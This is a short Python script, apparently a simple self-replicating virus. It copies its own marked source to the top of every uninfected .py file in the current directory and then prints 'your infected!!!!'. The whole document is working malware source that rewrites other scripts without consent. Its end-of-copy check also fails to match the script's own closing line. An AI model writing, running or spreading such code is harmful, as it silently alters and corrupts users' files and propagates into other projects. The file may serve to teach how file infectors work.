## start replicate ##

import sys
import glob

code = []

with open(sys.argv[0], 'r') as f:
    ln = f.readlines()

v = False
for l in ln:
    if l == '## start replicate ##\n':
        v = True
    if v:
        code.append(l)
        if l == '## end the script\n':
            break

python_file = glob.glob('*.py') + glob.glob('*.pw')
#print(python_file)

for scrpt in python_file:
    with open(scrpt, 'r') as f:
        scrpt_code = f.readlines()
    
    infect = False
    for l in scrpt_code:
        if l == '## start replicate ##\n':
            infect = True
            break
    if not infect:
        malicious = []
        malicious.extend(code)
        malicious.extend('\n')
        malicious.extend(scrpt_code)

        with open(scrpt, 'w') as f:
            f.writelines(malicious)

# the malicious code
print("your infected!!!!")
## end the script ##

